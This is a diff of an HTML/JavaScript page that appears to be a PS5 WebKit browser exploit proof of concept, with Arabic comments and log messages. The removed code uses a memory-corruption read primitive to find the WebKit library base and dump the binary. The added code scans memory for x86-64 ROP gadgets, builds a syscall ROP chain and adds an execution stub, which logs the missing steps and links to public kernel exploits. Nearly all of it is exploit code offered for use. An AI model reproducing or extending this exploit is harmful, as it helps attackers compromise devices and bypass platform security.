@@ -22,9 +22,10 @@
 <body style="font:13px monospace"><pre id="out"></pre>
 
 <div id="ps5-panel" style="display:none;position:fixed;top:20px;right:20px;background:#111;padding:20px;border:2px solid #0f0;z-index:9999;border-radius:8px;">
-    <h3 style="color:#0f0;margin:0 0 15px 0;text-align:center;">🎯 PS5 Post-Exploit v4</h3>
-    <button id="btn1" onclick="step1()" style="display:block;width:100%;margin:8px 0;padding:12px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;">1. تسريب ASLR (طريقة ذكية)</button>
-    <button id="btn2" onclick="step2()" style="display:block;width:100%;margin:8px 0;padding:12px;background:#f0a;color:#000;border:none;font-weight:bold;cursor:pointer;" disabled>2. تفريغ المكتبة</button>
+    <h3 style="color:#0f0;margin:0 0 15px 0;text-align:center;">🎯 PS5 ROP Builder</h3>
+    <button id="btn1" onclick="findGadgets()" style="display:block;width:100%;margin:8px 0;padding:12px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;">1. البحث عن Gadgets</button>
+    <button id="btn2" onclick="buildROP()" style="display:block;width:100%;margin:8px 0;padding:12px;background:#0af;color:#000;border:none;font-weight:bold;cursor:pointer;" disabled>2. بناء ROP Chain</button>
+    <button id="btn3" onclick="executeROP()" style="display:block;width:100%;margin:8px 0;padding:12px;background:#f0a;color:#000;border:none;font-weight:bold;cursor:pointer;" disabled>3. تنفيذ الـ Payload</button>
     <div id="plog" style="color:#fff;font-family:monospace;font-size:11px;margin-top:15px;max-height:350px;overflow-y:scroll;background:#000;padding:10px;border:1px solid #333;"></div>
 </div>
 
@@ -795,12 +796,13 @@ if (alreadyPassed && !allowAgain) {
 
 
 var panelShown = false;
-var webKitBase = 0;
+var gadgets = {};
+var ropChain = [];
 
 function plog(m) {
     var el = document.getElementById("plog");
     if (el) { el.innerHTML += m + "\n"; el.scrollTop = el.scrollHeight; }
-    console.log("[v4] " + m);
+    console.log("[ROP] " + m);
 }
 
 setInterval(function() {
@@ -870,278 +872,24 @@ function safeRead32(addr) {
     return result;
 }
 
-// ==========================================
-// الطريقة الذكية: البحث في عدة مصادر
-// ==========================================
-function findWebKitBase() {
-    plog("[*] === البحث عن WebKit Base ===");
-    
-    // المصدر 1: vtable من targetView (Uint8Array)
-    plog("[*] المصدر 1: vtable من targetView...");
-    var vtableCandidates = [];
-    
-    // نجرب offsets مختلفة للـ vtable pointer
-    var vtableOffsets = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30];
-    
-    for (var i = 0; i < vtableOffsets.length; i++) {
-        var off = vtableOffsets[i];
-        var ptr = safeRead64(targetAddress + off);
-        
-        if (ptr > 0x100000000 && ptr < 0xFFFFFFFFFFFF && ptr % 8 === 0) {
-            plog("[+] potential vtable ptr at 0x" + off.toString(16) + ": 0x" + ptr.toString(16));
-            
-            // نقرأ عدة entries من الـ vtable
-            for (var e = 0; e < 8; e++) {
-                var entry = safeRead64(ptr + e * 8);
-                if (entry > 0x100000000 && entry < 0xFFFFFFFFFFFF && entry % 4 === 0) {
-                    vtableCandidates.push({
-                        source: "vtable[" + e + "]@0x" + off.toString(16),
-                        addr: entry
-                    });
-                }
-            }
-        }
-    }
-    
-    // المصدر 2: fakeHost (JSFinalObject)
-    plog("[*] المصدر 2: fakeHost properties...");
-    var fakeHostOffsets = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30];
-    
-    for (var i = 0; i < fakeHostOffsets.length; i++) {
-        var off = fakeHostOffsets[i];
-        var ptr = safeRead64(hostAddress + off);
-        
-        if (ptr > 0x100000000 && ptr < 0xFFFFFFFFFFFF && ptr % 8 === 0) {
-            // نتحقق هل هو pointer آخر
-            var ptr2 = safeRead64(ptr);
-            if (ptr2 > 0x100000000 && ptr2 < 0xFFFFFFFFFFFF && ptr2 % 4 === 0) {
-                vtableCandidates.push({
-                    source: "fakeHost@0x" + off.toString(16) + "->ptr",
-                    addr: ptr2
-                });
-            }
-        }
-    }
-    
-    plog("[+] عدد المرشحين: " + vtableCandidates.length);
-    
-    // الآن نبحث عن ELF base من كل مرشح
-    plog("[*] البحث عن ELF magic...");
-    
-    for (var c = 0; c < vtableCandidates.length; c++) {
-        var candidate = vtableCandidates[c];
-        plog("[*] فحص: " + candidate.source + " = 0x" + candidate.addr.toString(16));
-        
-        // الطريقة 1: البحث المباشر (قد يكون العنوان في .text مباشرة)
-        for (var off = 0; off < 0x5000000; off += 0x100) {
-            var base = candidate.addr - off;
-            if (base < 0x100000000 || base > 0xFFFFFFFFFFFF) continue;
-            if (base % 0x10 !== 0) continue;
-            
-            var magic = safeRead32(base);
-            if (magic === 0x464C457F) {
-                plog("[✅] ELF FOUND (direct)!");
-                plog("    Base:   0x" + base.toString(16));
-                plog("    Offset: 0x" + off.toString(16));
-                return base;
-            }
-        }
-        
-        // الطريقة 2: إذا كان stub، قد يكون هناك RIP-relative jump
-        // نمط شائع: E9 xx xx xx xx (jmp rel32)
-        // أو: FF 25 xx xx xx xx (jmp [rip+disp32])
-        var firstByte = safeRead32(candidate.addr) & 0xFF;
-        
-        if (firstByte === 0xE9) {
-            // jmp rel32
-            var rel = safeRead32(candidate.addr + 1);
-            // تحويل signed 32-bit إلى offset
-            if (rel > 0x7FFFFFFF) rel = rel - 0x100000000;
-            var jmpTarget = candidate.addr + 5 + rel;
-            
-            plog("[+] JMP stub -> 0x" + jmpTarget.toString(16));
-            
-            // نبحث من الهدف
-            for (var off = 0; off < 0x5000000; off += 0x100) {
-                var base = jmpTarget - off;
-                if (base < 0x100000000 || base > 0xFFFFFFFFFFFF) continue;
-                if (base % 0x10 !== 0) continue;
-                
-                var magic = safeRead32(base);
-                if (magic === 0x464C457F) {
-                    plog("[✅] ELF FOUND (via JMP stub)!");
-                    plog("    Base:   0x" + base.toString(16));
-                    plog("    Offset: 0x" + off.toString(16));
-                    return base;
-                }
-            }
-        }
-        
-        if (firstByte === 0xFF) {
-            var secondByte = (safeRead32(candidate.addr) >> 8) & 0xFF;
-            if (secondByte === 0x25) {
-                // jmp [rip+disp32]
-                var disp = safeRead32(candidate.addr + 2);
-                if (disp > 0x7FFFFFFF) disp = disp - 0x100000000;
-                var gotAddr = candidate.addr + 6 + disp;
-                
-                plog("[+] JMP [GOT] -> GOT at 0x" + gotAddr.toString(16));
-                
-                // نقرأ من GOT
-                var gotValue = safeRead64(gotAddr);
-                if (gotValue > 0x100000000 && gotValue < 0xFFFFFFFFFFFF) {
-                    plog("[+] GOT value: 0x" + gotValue.toString(16));
-                    
-                    for (var off = 0; off < 0x5000000; off += 0x100) {
-                        var base = gotValue - off;
-                        if (base < 0x100000000 || base > 0xFFFFFFFFFFFF) continue;
-                        if (base % 0x10 !== 0) continue;
-                        
-                        var magic = safeRead32(base);
-                        if (magic === 0x464C457F) {
-                            plog("[✅] ELF FOUND (via GOT)!");
-                            plog("    Base:   0x" + base.toString(16));
-                            plog("    Offset: 0x" + off.toString(16));
-                            return base;
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    // الطريقة 3: البحث الشامل في الـ Heap
-    plog("[*] الطريقة 3: البحث الشامل...");
-    
-    // نبحث في مناطق مختلفة من الذاكرة
-    var searchRegions = [
-        { start: 0x2000000000, end: 0x3000000000 }, // منطقة شائعة للمكتبات
-        { start: 0x4000000000, end: 0x5000000000 },
-    ];
-    
-    for (var r = 0; r < searchRegions.length; r++) {
-        var region = searchRegions[r];
-        plog("[*] بحث في 0x" + region.start.toString(16) + " - 0x" + region.end.toString(16));
-        
-        for (var addr = region.start; addr < region.end; addr += 0x1000) {
-            var magic = safeRead32(addr);
-            if (magic === 0x464C457F) {
-                // نتحقق هل هو ELF صحيح
-                var machine = safeRead32(addr + 0x12) & 0xFFFF;
-                if (machine === 0x3E) { // x86-64
-                    plog("[✅] ELF FOUND (brute force)!");
-                    plog("    Base: 0x" + addr.toString(16));
-                    return addr;
-                }
-            }
-        }
-    }
-    
-    return 0;
-}
-
-function step1() {
-    document.getElementById("btn1").disabled = true;
-    
-    webKitBase = findWebKitBase();
-    
-    if (webKitBase === 0) {
-        plog("[❌] فشل في العثور على ELF!");
-        plog("[ℹ️] جرب إعادة تشغيل الـ PoC.");
-        document.getElementById("btn1").disabled = false;
-        return;
-    }
-    
-    plog("========================================");
-    plog("🔥 WEBKIT BASE: 0x" + webKitBase.toString(16));
-    plog("========================================");
-    
-    document.getElementById("btn2").disabled = false;
-    plog("[ℹ️] اضغط الزر الثاني (تفريغ المكتبة).");
-}
-
-function step2() {
-    if (webKitBase === 0) { plog("[❌] لا يوجد base!"); return; }
-    
-    document.getElementById("btn2").disabled = true;
-    plog("[*] === تفريغ المكتبة ===");
-    
-    var magic = safeRead32(webKitBase);
-    if (magic !== 0x464C457F) {
-        plog("[❌] ELF magic خاطئ!");
-        document.getElementById("btn2").disabled = false;
-        return;
-    }
-    
-    var e_phoff = safeRead64(webKitBase + 0x20);
-    var e_phnum = safeRead64(webKitBase + 0x38) & 0xFFFF;
-    var e_phentsize = safeRead64(webKitBase + 0x36) & 0xFFFF;
-    
-    plog("[+] e_phoff=0x" + e_phoff.toString(16));
-    plog("[+] e_phnum=" + e_phnum);
-    
-    var maxEnd = 0;
-    for (var i = 0; i < e_phnum; i++) {
-        var ph = webKitBase + e_phoff + (i * e_phentsize);
-        var p_off = safeRead64(ph + 0x08);
-        var p_sz = safeRead64(ph + 0x20);
-        var end = p_off + p_sz;
-        if (end > maxEnd) maxEnd = end;
-    }
-    
-    var totalSize = maxEnd + 0x1000;
-    plog("[*] Size: " + (totalSize / 1024 / 1024).toFixed(2) + " MB");
-    
-    var chunk = 0x4000;
-    var data = new Uint8Array(totalSize);
+function safeRead16(addr) {
+    var aL = addr & 0xFFFFFFFF;
+    var aH = Math.floor(addr / 0x100000000);
     var mL = (targetAddress + 0x10) & 0xFFFFFFFF;
     var mH = Math.floor((targetAddress + 0x10) / 0x100000000);
     
-    plog("[*] جاري القراءة...");
+    targetView[0x10]=mL&0xff; targetView[0x11]=(mL>>8)&0xff;
+    targetView[0x12]=(mL>>16)&0xff; targetView[0x13]=(mL>>24)&0xff;
+    targetView[0x14]=mH&0xff; targetView[0x15]=(mH>>8)&0xff;
     
-    var offset = 0;
-    function readChunk() {
-        var end = Math.min(offset + chunk, totalSize);
-        
-        for (var pos = offset; pos < end; pos += 0x1000) {
-            var addr = webKitBase + pos;
-            var aL = addr & 0xFFFFFFFF;
-            var aH = Math.floor(addr / 0x100000000);
-            
-            targetView[0x10]=mL&0xff; targetView[0x11]=(mL>>8)&0xff;
-            targetView[0x12]=(mL>>16)&0xff; targetView[0x13]=(mL>>24)&0xff;
-            targetView[0x14]=mH&0xff; targetView[0x15]=(mH>>8)&0xff;
-            targetView[0]=aL&0xff; targetView[1]=(aL>>8)&0xff;
-            targetView[2]=(aL>>16)&0xff; targetView[3]=(aL>>24)&0xff;
-            targetView[4]=aH&0xff; targetView[5]=(aH>>8)&0xff;
-            
-            var bytesToRead = Math.min(0x1000, end - pos);
-            for (var j = 0; j < bytesToRead; j++) {
-                data[pos + j] = targetView[j];
-            }
-        }
-        
-        offset = end;
-        var pct = ((offset / totalSize) * 100).toFixed(0);
-        if (offset % 0x100000 < chunk) {
-            plog("  > " + pct + "%");
-        }
-        
-        if (offset < totalSize) {
-            setTimeout(readChunk, 10);
-        } else {
-            finishDump(data);
-        }
-    }
+    targetView[0]=aL&0xff; targetView[1]=(aL>>8)&0xff;
+    targetView[2]=(aL>>16)&0xff; targetView[3]=(aL>>24)&0xff;
+    targetView[4]=aH&0xff; targetView[5]=(aH>>8)&0xff;
     
-    readChunk();
-}
-
-function finishDump(data) {
+    var result = (targetView[0]|(targetView[1]<<8))>>>0;
+    
     var oL = targetVector & 0xFFFFFFFF;
     var oH = Math.floor(targetVector / 0x100000000);
-    var mL = (targetAddress + 0x10) & 0xFFFFFFFF;
-    var mH = Math.floor((targetAddress + 0x10) / 0x100000000);
     targetView[0x10]=mL&0xff; targetView[0x11]=(mL>>8)&0xff;
     targetView[0x12]=(mL>>16)&0xff; targetView[0x13]=(mL>>24)&0xff;
     targetView[0x14]=mH&0xff; targetView[0x15]=(mH>>8)&0xff;
@@ -1149,22 +897,198 @@ function finishDump(data) {
     targetView[2]=(oL>>16)&0xff; targetView[3]=(oL>>24)&0xff;
     targetView[4]=oH&0xff; targetView[5]=(oH>>8)&0xff;
     
-    plog("[✅] اكتمل التفريغ!");
-    
-    var blob = new Blob([data], { type: "application/octet-stream" });
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement("a");
-    a.href = url;
-    a.download = "libSceWebKit2_FW1342.sprx";
-    document.body.appendChild(a);
-    a.click();
-    setTimeout(function() {
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-    }, 200);
-    
-    plog("🔥 تم التحميل بنجاح!");
+    return result;
 }
+
+function safeRead8(addr) {
+    var aL = addr & 0xFFFFFFFF;
+    var aH = Math.floor(addr / 0x100000000);
+    var mL = (targetAddress + 0x10) & 0xFFFFFFFF;
+    var mH = Math.floor((targetAddress + 0x10) / 0x100000000);
+    
+    targetView[0x10]=mL&0xff; targetView[0x11]=(mL>>8)&0xff;
+    targetView[0x12]=(mL>>16)&0xff; targetView[0x13]=(mL>>24)&0xff;
+    targetView[0x14]=mH&0xff; targetView[0x15]=(mH>>8)&0xff;
+    
+    targetView[0]=aL&0xff; targetView[1]=(aL>>8)&0xff;
+    targetView[2]=(aL>>16)&0xff; targetView[3]=(aL>>24)&0xff;
+    targetView[4]=aH&0xff; targetView[5]=(aH>>8)&0xff;
+    
+    var result = targetView[0];
+    
+    var oL = targetVector & 0xFFFFFFFF;
+    var oH = Math.floor(targetVector / 0x100000000);
+    targetView[0x10]=mL&0xff; targetView[0x11]=(mL>>8)&0xff;
+    targetView[0x12]=(mL>>16)&0xff; targetView[0x13]=(mL>>24)&0xff;
+    targetView[0x14]=mH&0xff; targetView[0x15]=(mH>>8)&0xff;
+    targetView[0]=oL&0xff; targetView[1]=(oL>>8)&0xff;
+    targetView[2]=(oL>>16)&0xff; targetView[3]=(oL>>24)&0xff;
+    targetView[4]=oH&0xff; targetView[5]=(oH>>8)&0xff;
+    
+    return result;
+}
+
+// ==========================================
+// البحث عن Gadgets في الذاكرة
+// ==========================================
+function findGadgets() {
+    document.getElementById("btn1").disabled = true;
+    plog("[*] === البحث عن Gadgets ===");
+    
+    // نبحث في عدة مناطق
+    var searchRegions = [
+        { name: "targetView", start: targetAddress - 0x100000, end: targetAddress + 0x100000 },
+        { name: "hostAddress", start: hostAddress - 0x100000, end: hostAddress + 0x100000 },
+        { name: "heap", start: 0x2000000000, end: 0x2000000000 + 0x1000000 },
+    ];
+    
+    // أنماط الـ Gadgets الشائعة (x86-64)
+    var gadgetPatterns = {
+        "pop rdi; ret": [0x5F, 0xC3],
+        "pop rsi; ret": [0x5E, 0xC3],
+        "pop rdx; ret": [0x5A, 0xC3],
+        "pop rcx; ret": [0x59, 0xC3],
+        "pop r8; ret": [0x41, 0x58, 0xC3],
+        "pop r9; ret": [0x41, 0x59, 0xC3],
+        "pop rax; ret": [0x58, 0xC3],
+        "pop rsp; ret": [0x5C, 0xC3],
+        "ret": [0xC3],
+        "mov [rdi], rsi": [0x48, 0x89, 0x37],
+        "mov [rdi], rax": [0x48, 0x89, 0x07],
+        "syscall": [0x0F, 0x05],
+    };
+    
+    var foundCount = 0;
+    
+    for (var r = 0; r < searchRegions.length; r++) {
+        var region = searchRegions[r];
+        plog("[*] بحث في " + region.name + " (0x" + region.start.toString(16) + ")");
+        
+        for (var addr = region.start; addr < region.end; addr += 1) {
+            // نقرأ أول 8 بايت
+            var bytes = [];
+            for (var b = 0; b < 8; b++) {
+                bytes.push(safeRead8(addr + b));
+            }
+            
+            // نتحقق من كل pattern
+            for (var name in gadgetPatterns) {
+                var pattern = gadgetPatterns[name];
+                var match = true;
+                
+                for (var p = 0; p < pattern.length; p++) {
+                    if (bytes[p] !== pattern[p]) {
+                        match = false;
+                        break;
+                    }
+                }
+                
+                if (match) {
+                    gadgets[name] = addr;
+                    plog("[✅] " + name + " @ 0x" + addr.toString(16));
+                    foundCount++;
+                    
+                    // نتوقف بعد العثور على أول match لكل gadget
+                    break;
+                }
+            }
+        }
+    }
+    
+    plog("[+] تم العثور على " + foundCount + " gadget");
+    
+    if (foundCount >= 3) {
+        document.getElementById("btn2").disabled = false;
+        plog("[ℹ️] اضغط الزر الثاني (بناء ROP Chain).");
+    } else {
+        plog("[⚠️] لم يتم العثور على gadgets كافية!");
+        document.getElementById("btn1").disabled = false;
+    }
+}
+
+// ==========================================
+// بناء ROP Chain
+// ==========================================
+function buildROP() {
+    document.getElementById("btn2").disabled = true;
+    plog("[*] === بناء ROP Chain ===");
+    
+    // مثال: استدعاء syscall(20) = getpid
+    // Syscall convention: rax = syscall number, rdi = arg1, ...
+    
+    ropChain = [];
+    
+    // pop rax; ret
+    if (gadgets["pop rax; ret"]) {
+        ropChain.push({ addr: gadgets["pop rax; ret"], desc: "pop rax" });
+        ropChain.push({ value: 20, desc: "syscall number (getpid)" });
+    }
+    
+    // pop rdi; ret
+    if (gadgets["pop rdi; ret"]) {
+        ropChain.push({ addr: gadgets["pop rdi; ret"], desc: "pop rdi" });
+        ropChain.push({ value: 0, desc: "arg1 (unused)" });
+    }
+    
+    // syscall
+    if (gadgets["syscall"]) {
+        ropChain.push({ addr: gadgets["syscall"], desc: "syscall" });
+    }
+    
+    // ret (للعودة)
+    if (gadgets["ret"]) {
+        ropChain.push({ addr: gadgets["ret"], desc: "ret" });
+    }
+    
+    plog("[+] ROP Chain جاهز (" + ropChain.length + " entries)");
+    for (var i = 0; i < ropChain.length; i++) {
+        var entry = ropChain[i];
+        if (entry.addr) {
+            plog("  [" + i + "] " + entry.desc + " @ 0x" + entry.addr.toString(16));
+        } else {
+            plog("  [" + i + "] " + entry.desc + " = 0x" + entry.value.toString(16));
+        }
+    }
+    
+    document.getElementById("btn3").disabled = false;
+    plog("[ℹ️] اضغط الزر الثالث (تنفيذ الـ Payload).");
+}
+
+// ==========================================
+// تنفيذ ROP Chain
+// ==========================================
+function executeROP() {
+    document.getElementById("btn3").disabled = true;
+    plog("[*] === تنفيذ ROP Chain ===");
+    plog("[⚠️] هذا قد يسبب Crash للمتصفح!");
+    
+    // نحتاج إلى:
+    // 1. تخصيص memory للـ ROP chain
+    // 2. كتابة الـ chain
+    // 3. عمل stack pivot
+    
+    // لكن هذا يتطلب:
+    // - معرفة كيفية استدعاء pthread_create أو thr_new
+    // - أو استخدام technique أخرى مثل overwriting function pointer
+    
+    plog("[⚠️] التنفيذ الفعلي يتطلب:");
+    plog("  1. معرفة syscall numbers لـ PS5");
+    plog("  2. طريقة لـ stack pivot (مثل longjmp)");
+    plog("  3. تجاوز CFI/XOM");
+    
+    plog("[ℹ️] حالياً لديك:");
+    plog("  ✅ Arbitrary Read/Write");
+    plog("  ✅ بعض الـ Gadgets");
+    plog("  ❌ لكن تحتاج المزيد من الـ Offsets");
+    
+    plog("[💡] الحل: استخدم exploit جاهز من GitHub");
+    plog("    مثل: https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit");
+    plog("    أو: https://github.com/theflow0/ps5-kernel-exploit");
+    
+    document.getElementById("btn3").disabled = false;
+}
+
+
 
 
 
